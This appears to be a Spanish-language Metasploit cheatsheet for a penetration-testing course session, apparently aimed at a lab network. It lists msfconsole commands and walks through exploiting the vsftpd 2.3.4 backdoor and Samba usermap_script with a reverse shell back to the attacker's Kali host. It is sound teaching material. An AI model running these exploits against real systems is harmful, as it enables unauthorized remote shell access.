# 🎯 Metasploit Framework Cheatsheet — Sesión 5

---

## 🔹 Comandos esenciales de `msfconsole`

| Comando | Qué hace |
|---|---|
| `msfconsole` | Inicia la consola de Metasploit |
| `search <término>` | Busca módulos (exploits, auxiliary, payloads) por palabra clave |
| `use <ruta_del_módulo>` | Selecciona un módulo para configurarlo |
| `show options` | Muestra las opciones configurables del módulo actual |
| `set <OPCIÓN> <valor>` | Configura una opción (ej. `set RHOSTS`) |
| `set PAYLOAD <payload>` | Define el payload a usar |
| `run` / `exploit` | Ejecuta el módulo configurado |
| `back` | Sale del módulo actual sin cerrar la consola |
| `sessions -l` | Lista las sesiones activas (shells obtenidas) |
| `sessions -i <id>` | Interactúa con una sesión específica |

## 🧪 Ejemplo completo: explotar vsftpd 2.3.4 (backdoor)

```bash
msfconsole

search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.56.X
run
```

## 🧪 Ejemplo: explotar Samba (usermap script)

```bash
search samba usermap
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.X
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.56.Y   # tu IP de Kali
run
```

## 🔹 Opciones clave a entender

| Opción | Significado |
|---|---|
| `RHOSTS` | IP(s) del objetivo (Remote Host) |
| `RPORT` | Puerto del servicio objetivo |
| `LHOST` | Tu IP (Local Host) — a donde se conecta la shell reversa |
| `LPORT` | Puerto en tu máquina que espera la conexión reversa |

## 🔹 Bind shell vs. Reverse shell

| Tipo | Cómo funciona | Cuándo se usa |
|---|---|---|
| **Bind** | El objetivo abre un puerto y espera que TÚ te conectes | Cuando no hay firewall bloqueando entrada al objetivo |
| **Reverse** | El objetivo se conecta DE VUELTA a ti | Más común en el mundo real (evade firewalls salientes mal configurados) |

---

## ✅ Checklist de esta fase

- [ ] Encontré un módulo de exploit adecuado con `search`
- [ ] Configuré correctamente `RHOSTS`/`LHOST`/`PAYLOAD`
- [ ] Obtuve una sesión activa (`sessions -l` la muestra)
- [ ] Documenté el módulo exacto usado en mi reporte
